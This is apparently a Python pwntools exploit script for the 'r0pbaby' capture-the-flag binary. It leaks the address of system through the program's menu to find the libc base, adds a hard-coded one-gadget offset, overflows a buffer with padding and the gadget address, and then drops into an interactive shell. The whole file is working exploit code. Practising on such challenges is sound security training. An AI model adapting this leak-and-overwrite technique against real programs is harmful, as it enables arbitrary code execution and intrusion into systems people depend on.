from pwn import *

def get_libc():
	r.sendlineafter(": ", '2')
	r.sendlineafter("symbol: ", "system")
	r.recvuntil("system: ")
	return int(r.recv(18), 16) - l.functions["system"].address

def fill_buffer(size, data):
	r.sendlineafter(": ", '3')
	r.sendlineafter("(max 1024): ", str(size))
	r.sendline(data)

def exit():
	r.sendlineafter(": ", '4')
	r.recv(1024)

r = process("./r0pbaby")
l = r.libc

libc_base = get_libc()
oneshot = libc_base + 0xf0567
log.info("libc_base : " + hex(libc_base))

payload = 'A' * 8
payload += p64(oneshot)
fill_buffer(len(payload) + 1, payload)
exit()

r.interactive()